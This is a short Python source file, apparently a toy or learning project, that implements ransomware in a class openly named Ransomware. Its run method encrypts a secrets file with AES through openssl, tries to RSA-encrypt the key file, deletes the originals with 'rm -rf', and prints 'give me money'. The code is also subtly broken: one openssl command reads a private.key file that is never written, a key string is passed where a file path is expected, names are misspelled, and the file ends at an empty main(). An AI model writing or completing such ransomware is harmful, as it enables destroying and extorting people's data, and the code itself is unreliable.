import subprocess
import sys
import os

KEY_FILE = "./key.txt"
CIPHER_KEY_FILE = "./key_cipher.txt"
SECRET_FILE = "./my_secrets.txt"
CIPER_DATA_FILE = "./data_cyper.txt"

class Ransomware:

    def __init__(self, key_file, ciper_key_file, secret_file, cipher_data_file):
        self.private_key = None
        self.public_key = None
        self.key_file = key_file
        self.ciper_key_file = ciper_key_file
        self.secret_file = secret_file
        self.cipher_data_file = cipher_data_file

    @staticmethod
    def generate_random_key():
        cmd = "openssl rand -base64 16"
        result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
        return result.stdout.strip()


    def generate_symmetric_key(self):
        gen_private_cmd = f"openssl genrsa 2048"
        result = subprocess.run(gen_private_cmd, shell=True, check=True, capture_output=True, text=True)
        self.private_key = result.stdout.strip()

        gen_public_cmd = f"openssl rsa -in private.key -pubout"
        result = subprocess.run(gen_public_cmd, shell=True, check=True, capture_output=True, text=True)
        self.public_key = result.stdout.strip()

    def encrypt_file(self):
        if not os.path.isfile(self.secret_file) or not os.path.isfile(self.key_file):
            raise FileNotFoundError("File not found")

        cmd = f"openssl enc -aes-256-cbc -salt -in {self.secret_file} -out {self.cipher_data_file} -pass file:{self.key_file}"
        result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)

    def encrypt_symmetric(self, file_path, encrypted_file_path):
        if not os.path.isfile(file_path):
            raise FileNotFoundError("File not found")
        if not self.public_key or not self.private_key:
            raise Exception("No public key or private key initialized!")

        cmd = f"openssl rsautl -encrypt -pubin -inkey {self.public_key} -in {file_path} -out {encrypted_file_path}"
        subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)

    def delete_files(self):
        cmd = f"rm -rf {self.secret_file} {self.key_file}"
        subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)

    # def encryp

    def run(self):
        try:
            self.generate_symmetric_key()

            key = Ransomware.generate_random_key()
            with open(self.key_file, "w") as key_file:
                key_file.write(key)

            self.generate_symmetric_key()
            self.encrypt_file()
            self.encrypt_symmetric(self.key_file, self.ciper_key_file)

            self.delete_files()
            print("give me money")

        except Exception as e:
            print(f"Error: {e}")
            return






def main():
